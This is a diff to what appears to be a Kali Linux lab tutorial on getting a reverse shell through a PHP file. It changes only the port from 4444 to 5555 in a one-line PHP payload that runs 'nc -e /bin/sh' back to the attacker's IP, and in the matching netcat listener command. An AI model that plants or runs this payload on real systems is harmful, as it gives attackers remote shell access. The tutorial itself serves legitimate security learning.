@@ -120,7 +120,7 @@ Both machines must be on the same network so they can communicate.
 On Kali Linux, create a simple PHP file:
 
 ```php
-<?php passthru("nc -e /bin/sh <KALI-IP> 4444"); ?>
+<?php passthru("nc -e /bin/sh <KALI-IP> 5555"); ?>
 ```
 
 * `passthru()` → Executes system commands
@@ -170,7 +170,7 @@ http://<KALI-IP>/reverse.txt
 On Kali, start Netcat:
 
 ```bash
-nc -lnvp 4444
+nc -lnvp 5555
 ```
 
 ---
